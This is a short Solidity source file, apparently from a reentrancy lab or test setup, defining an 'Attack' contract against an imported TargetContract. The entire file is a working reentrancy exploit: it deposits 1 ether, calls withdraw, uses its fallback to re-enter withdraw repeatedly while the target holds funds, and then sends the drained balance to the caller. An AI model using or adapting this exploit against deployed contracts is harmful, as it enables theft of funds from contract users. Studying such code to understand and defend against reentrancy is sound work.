// SPDX-License-Identifier: MIT

import "../contracts/TargetContract.sol";

pragma solidity 0.8.8;
contract Attack {
    TargetContract public targetContract;

    constructor(address _targetContractAddress) {
        targetContract = TargetContract(_targetContractAddress);
    }

    // Fallback is called when targetContract sends Ether to this contract.
    fallback() external payable {
        if (address(targetContract).balance >= 1 ether) {
            targetContract.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        targetContract.deposit{value: 1 ether}();
        targetContract.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    function withdraw() public payable {
    (bool os, ) = payable(msg.sender).call{value: address(this).balance}("");
    require(os, "Transaction ended with failure");
    }
}